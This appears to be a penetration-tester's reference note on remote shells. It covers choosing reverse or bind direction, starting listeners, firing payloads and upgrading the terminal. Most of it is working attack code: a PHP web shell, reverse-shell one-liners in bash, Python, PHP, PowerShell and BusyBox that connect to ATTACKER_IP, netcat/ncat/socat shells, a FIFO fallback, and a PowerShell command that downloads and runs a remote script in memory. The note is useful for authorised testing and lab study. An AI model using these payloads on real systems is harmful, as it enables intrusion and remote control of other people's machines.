# Shells

The single canonical shell note, from foothold to a usable terminal. The path is always the same five moves: **choose the direction, start the listener, fire the payload, catch it, then upgrade it** — and [[Security-Terms#^tls|TLS]] only when you actually need it.

The reason this note exists is that every one of those moves fails in a way that looks like a different move failing. A payload with no `-e` connects and gives you a channel with no shell. A raw shell that "hangs" on `su` is not broken, it just has no PTY. Naming which layer failed is the whole skill; the commands are the easy part.

> Use these only against systems you are authorised to test. Replace every IP, port, path and shell binary with values valid for your environment.

## Core Model

Netcat, Ncat and Socat move bytes. A connection becomes a *shell* only when one endpoint attaches a command interpreter — `/bin/bash`, `sh`, `cmd.exe`, `powershell.exe`.

```text
Raw channel:  terminal ↔ TCP ↔ terminal
Shell:        terminal ↔ TCP ↔ shell process
```

Without `-e`, `--exec`, or Socat's `EXEC:`, two Netcat endpoints still exchange text in both directions — but `whoami` is only text; nothing interprets it. This one distinction explains the single most common "my shell is broken" report, and section 2's **What you will see** turns on it.

### Reverse vs bind shell

```text
REVERSE: target connects  ───────→ attacker listens
BIND:    attacker connects ──────→ target listens
```

- **Reverse** — the default. The target dials out to your listener. Preferred because outbound egress is usually looser than inbound, and because a target behind [[Security-Terms#^nat|NAT]] can still reach you.
- **Bind** — the target listens and you connect in. Use it only when outbound from the target is blocked but an inbound port to it is reachable — rare, and defeated by any inbound firewall.
- in both cases the **target** runs the shell; only the direction of the TCP connection changes.

## Web Shells

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Reach it after upload with `http://victim.example/uploads/shell.php?cmd=whoami`.

- `$_GET['cmd']` → reads the `?cmd=` value; `isset(...)` runs `system` only when the parameter is present. URL-encode spaces and metacharacters: `cat%20/etc/passwd`.
- keep it **minimal** → `p0wny-shell`, `b374k`, `c99` are ready-made, but a feature-heavy shell is more bytes on disk for antivirus to catch and more noise in the logs. The smallest thing that runs a command wins.

## Reverse Shell Payloads

All of these follow one model: connect to the attacker, wire stdin/stdout/stderr to the socket, start a shell.

### Bash

<!-- layers-ok -->
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

- `bash -i` → interactive bash; `>& /dev/tcp/ATTACKER_IP/443` → send stdout+stderr over bash's TCP pseudo-device; `0>&1` → attach stdin to the same socket.
- `/dev/tcp` is a **bash** feature, not a real device → it does not exist in `sh`, `dash`, or many `system()` contexts. Fired where `/bin/sh` is really `dash`, it fails with `No such file or directory` for `/dev/tcp`, which reads like a missing file and is actually the wrong shell. Wrap it: `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`.

### Python

<!-- layers-ok -->
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

- opens the socket, maps fds `0/1/2` onto it, and spawns bash inside a **PTY** — so this payload lands a shell that is already half-stabilised, unlike the bash one-liner.
- the target-side PTY improves interaction, but your listener may still need the full stabilisation sequence in section 4.

### PHP

<!-- layers-ok -->
```bash
php -r '$s=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

- for PHP execution contexts — a web shell or PHP RCE. The socket is usually fd `3`, but that is environment-dependent; if nothing connects, the fd number is the first thing to vary.
- `exec`, `system`, `shell_exec`, `passthru`, `popen` behave differently and are disabled independently — check what is enabled rather than assuming they are interchangeable.

### PowerShell

The one that matters on Windows: no file to upload, no `nc.exe` to smuggle across. Paste it into an RDP session, a `cmd.exe` window, or any Windows RCE.

<!-- layers-ok -->
```powershell
$c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

- `New-Object System.Net.Sockets.TCPClient(...)` → the outbound connection. Windows has no `/dev/tcp`, so the socket is built through .NET.
- `iex $d` → run whatever arrives as a command; `2>&1|Out-String` folds errors into output so a failed command reports back instead of vanishing.
- run it from `cmd.exe` by wrapping: `powershell -nop -w hidden -c "<payload>"` — `-nop` skips the profile script, `-w hidden` hides the window. Catch it with a plain `nc -lvnp 443`.

### BusyBox and Telnet fallbacks

<!-- layers-ok -->
```bash
busybox nc ATTACKER_IP 443 -e sh
```

<!-- layers-ok -->
```bash
TF=$(mktemp -u); mkfifo "$TF" && telnet ATTACKER_IP 443 0<"$TF" | sh 1>"$TF"
```

- for stripped embedded systems with no bash and no full netcat. BusyBox applets and their flags vary by build; telnet is a transport of last resort, not a secure channel.

### Backgrounding

<!-- layers-ok -->
```bash
bash -c 'nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &'
```

- `nohup` detaches from the parent, `&` backgrounds it — so the shell survives the web request or process that launched it exiting. This buys persistence of the *process*, not stability of the *session*.

**What you will see** (this block covers every payload above)

## Catching the shell

### Listener

`nc -lvnp 4444`

- `-l` listen, `-v` verbose (so you see the connect line), `-n` no DNS (so it does not hang resolving the target), `-p` local port.
- `-v` is the flag people drop → without it a successful connection prints nothing and you cannot tell a live shell from a dead listener. Keep it; the `connect from ...` line is your only proof the target reached you.
- TCP is the default; `-u` selects UDP (rare for shells). Ports under 1024 need root; `4444` does not. OpenBSD, traditional, GNU and BusyBox `nc` differ — check `nc -h` on the actual host rather than trusting memorised flags.

### Logging the session

Record the whole terminal session — the option to use for a write-up:

```bash
mkdir -p ~/loot/<box>
```

```bash
script ~/loot/<box>/<box>.log
```

- `script` records **everything** — every command you type and everything that returns — into the file. Run it before you touch the box; `exit` stops it. Keep the log and your screenshots in the same `~/loot/<box>/` folder, named after the box, not `log.txt` — a week later you will have nine and no way to tell them apart.

Two scoped alternatives that log only the reverse-shell connection:

<!-- layers-ok -->
```bash
nc -lvnp 4444 | tee ~/loot/<box>/shell.log
```

- `tee` writes what arrives to file **and** screen. Records the shell's output only, not your typing. Safe on a raw shell; do **not** use it after a PTY upgrade — `stty raw -echo` hands the terminal to the remote side and the pipe breaks the interaction.

<!-- layers-ok -->
```bash
script -q -c "nc -lvnp 4444" ~/loot/<box>/shell.log
```

- survives the TTY upgrade, which is why it is the better choice for anything longer than a quick look. Cost: it captures control characters, so strip them for reading with `sed -r 's/\x1B\[[0-9;]*[a-zA-Z]//g'`.

### Reverse shell with `-e`

Attacker: `nc -lvnp 4444`  Target: `nc ATTACKER_IP 4444 -e /bin/bash`

- `-e /bin/bash` → after connecting, execute bash and wire it to the socket. Without it you get the raw channel from the Core Model — bytes, no shell.
- `-e` is **deliberately absent** from most OpenBSD `nc` builds (the default on Kali and modern Debian). A command that worked on one target's `nc` may simply not have the flag on the next; the failure is `nc: invalid option -- 'e'`, which sends you to the FIFO fallback below.

### Bind shell with `-e`

Target: `nc -lvnp 8080 -e /bin/bash`  Attacker: `nc -nv TARGET_IP 8080`

- `-e` stays on the **target** because the target exposes the shell in a bind layout too; only the connection direction flipped.

### FIFO fallback when `-e` is unavailable

Reverse: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f`

- `mkfifo` makes a [[Security-Terms#^fifo|named pipe]]; `cat /tmp/f` feeds received bytes into the shell; `2>&1` returns stderr; the final `>/tmp/f` writes the network's input back into the pipe, closing the loop.
- this is the answer to `nc: invalid option -- 'e'`. It needs a writable `/tmp` and the syntax around `nc -l` is variant-dependent — adapt from the installed build's help.

### Other flags seen in labs

- `-w SECONDS` connection/idle timeout; `-q SECONDS` wait after EOF before closing; `-k` keep listening after a client disconnects. Semantics vary by build and none are needed for a single interactive catch.

## Ncat — when `nc` lacks `-e` or you need TLS

### Plain shells

<!-- layers-ok -->
```bash
# reverse — attacker listens, target connects back with a shell attached
ncat -lvnp 4444
```

```bash
ncat ATTACKER_IP 4444 -e /bin/bash
```

- `-e`/`--exec` runs the program directly (give a full path); `-c`/`--sh-exec` passes a string through a shell when you need shell interpretation. For a bind layout the `-e` moves to the listening target, exactly as with `nc`.

### TLS-encrypted shells

```bash
# reverse, encrypted — BOTH ends must speak TLS
ncat --ssl -lvnp 4444
```

```bash
ncat --ssl ATTACKER_IP 4444 -e /bin/bash
```

- both endpoints must be TLS → a plain `nc` client **cannot** complete the handshake with an `ncat --ssl` listener. The symptom is a connection that opens and instantly drops with a TLS error on the listener; it is not a broken shell, it is a plaintext client against a TLS server.
- an Ncat TLS listener mints a throwaway certificate when none is given; `--ssl-verify --ssl-trustfile CERT.pem` when you actually need to authenticate the peer. Encryption hides content in transit only — not IPs, ports, timing, or process activity on the host.

**What you will see** (Ncat, both variants)

## Socat — robust PTY and encrypted channels

### Plain TCP reverse shell

Attacker: `socat -d -d TCP-LISTEN:443,reuseaddr STDIO`

Target: `socat TCP:ATTACKER_IP:443 EXEC:"bash -li",stderr`

- `TCP-LISTEN` accepts the incoming connection; `STDIO` wires your terminal both ways (`STDOUT` alone is output-only and not enough); `EXEC:"bash -li"` runs the shell; `reuseaddr` lets you re-bind the port immediately after a drop; `-d -d` prints connection diagnostics.
- Windows target: `socat TCP:ATTACKER_IP:443 EXEC:powershell.exe,pipes` (or `cmd.exe,pipes`).

### Plain TCP bind shell

Target: `socat TCP-LISTEN:8088,reuseaddr EXEC:"bash -li",stderr`

Attacker: `socat STDIO TCP:TARGET_IP:8088`

### Fully interactive Socat PTY

Get your terminal size first with `stty size`, then:

```bash
socat TCP-LISTEN:5555,reuseaddr FILE:`tty`,raw,echo=0
```

Target: `socat TCP:ATTACKER_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- `pty` allocates a pseudo-terminal on the target; `sigint` passes `Ctrl+C` through; `setsid` runs it in a new session; `sane` applies usable terminal defaults; ``FILE:`tty`,raw,echo=0`` attaches your side raw with no double echo. This pair gives a full interactive shell with **no** post-catch `stty` sequence — the reason to carry a Socat binary at all.
- Socat absent on the target? Transfer a static build ([[File-Transfer]]) to `/tmp/socat`, `chmod +x`, and run it. Architecture and libc mismatches can make a transferred binary fail to execute — check `file` on it if it will not run.

**What you will see** (Socat PTY pair)

## Shell Stabilisation — TTY Upgrade

### Python PTY + local terminal setup

Note your own terminal size first (`stty size`), then after catching the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

Then `Ctrl+Z` to suspend the listener, and on your own box:

```bash
stty raw -echo
```

```bash
fg
```

Press Enter to redraw, then on the target: `stty rows ROWS cols COLS`.

- `pty.spawn()` allocates the target-side PTY; `stty raw -echo` hands your local keystrokes straight through and stops double echo; `fg` resumes the listener; `TERM` and the row/col sizes let full-screen programs render.
- the step people get wrong is `stty raw -echo` → run it on **your** machine while the listener is suspended, not on the target. Forget it and you get no line editing and doubled characters; run it and forget to restore afterwards and your terminal is wrecked — fix with `stty sane` or a blind `reset`.

### `rlwrap`

`rlwrap nc -lvnp 4444`

- wraps the listener with Readline: history, arrow keys, editing on **your** side only. Cheap and instant, but it does **not** allocate a target PTY or give job control — combine it with a target-side upgrade when you need real terminal behaviour.

### PTY fallbacks

```bash
script -qc /bin/bash /dev/null
```

- `script` allocates a PTY when Python is absent (`/dev/null` discards its log). `/bin/bash -i` alone improves the prompt but creates no PTY. Support varies by implementation.
- `-q` drops the `Script started` banner, `-c` runs one command instead of an interactive session. Drop the `/dev/null` and `script` writes a `typescript` file into the working directory — an artefact left on the target that outlives your session.

### Windows — ConPtyShell

Attacker, in this order — the `stty` call must come **before** the connection lands:

```bash
stty raw -echo; nc -lvnp 3001
```

Target, from the shell you already hold:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell ATTACKER_IP 3001 -Rows 40 -Cols 160
```

- `IEX(...DownloadString(...))` fetches and runs the script in memory — nothing on disk. Serve it with `python3 -m http.server 80`. `-Rows`/`-Cols` take your `stty size` values or full-screen programs render into the wrong shape.
- restore your terminal with `stty sane` when the session ends; `stty raw -echo` leaves it unusable otherwise.

> [!important] Needs Windows 1809 or newer
> On anything older the ConPTY API does not exist and the script silently drops to a non-interactive fallback — which looks exactly like the upgrade failing for some other reason. Check first with `[System.Environment]::OSVersion.Version`.

## Fast Decision Guide

- quick catch → `nc -lvnp PORT`
- target `nc` has `-e` → direct shell; otherwise a FIFO fallback or another payload language
- need consistent `--exec`/TLS and Ncat exists → `ncat`
- need a robust Linux PTY and Socat exists → the Socat PTY pair (no post-catch `stty`)
- already caught a raw shell → Python PTY + `stty raw -echo`
- want local history/editing only → `rlwrap`
- need confidentiality in transit → TLS on **both** endpoints; decide peer authentication separately
- Windows, and you have a credential → skip the whole upgrade problem with [[5985-WinRM]]
